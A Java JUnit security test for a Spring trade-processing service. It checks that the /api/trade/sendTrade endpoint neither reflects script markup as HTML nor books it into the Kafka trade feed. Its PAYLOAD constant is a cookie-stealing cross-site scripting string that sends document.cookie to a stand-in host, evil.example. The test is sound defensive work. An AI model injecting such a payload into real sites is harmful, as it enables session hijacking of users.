package com.Himanshu.TradesPostProcessingSystem.swarm;

import com.Himanshu.TradesPostProcessingSystem.controller.TradeController;
import com.Himanshu.TradesPostProcessingSystem.model.Trade;
import com.Himanshu.TradesPostProcessingSystem.service.TradeService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/** INJECT-1: a crafted /api/trade/sendTrade link reflects attacker markup as text/html and books it into the trade feed. */
@Tag("swarm")
class Inject1SwarmTest {

    private static final String BROWSER_ACCEPT =
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    private static final String PAYLOAD = "<script>fetch('//evil.example/?c='+document.cookie)</script>";

    private KafkaTemplate<String, Trade> kafka;
    private MockMvc mvc;

    @BeforeEach
    @SuppressWarnings("unchecked")
    void setUp() {
        kafka = mock(KafkaTemplate.class);
        TradeService service = new TradeService();
        ReflectionTestUtils.setField(service, "kafkaTemplate", kafka);
        TradeController controller = new TradeController();
        ReflectionTestUtils.setField(controller, "tradeService", service);
        mvc = MockMvcBuilders.standaloneSetup(controller).build();
    }

    @Test
    void scriptInSymbolIsNotReflectedAsHtmlNorBooked() throws Exception {
        MvcResult result = mvc.perform(get("/api/trade/sendTrade")
                        .header("Accept", BROWSER_ACCEPT)
                        .param("symbol", PAYLOAD)
                        .param("quantity", "100")
                        .param("price", "190.0"))
                .andReturn();

        String body = result.getResponse().getContentAsString();
        String contentType = String.valueOf(result.getResponse().getContentType());
        assertThat(contentType.contains("html") && body.contains("<script"))
                .as("response rendered as %s with attacker script: %s", contentType, body)
                .isFalse();
        verify(kafka, never()).send(anyString(), anyString(), any(Trade.class));
    }
}
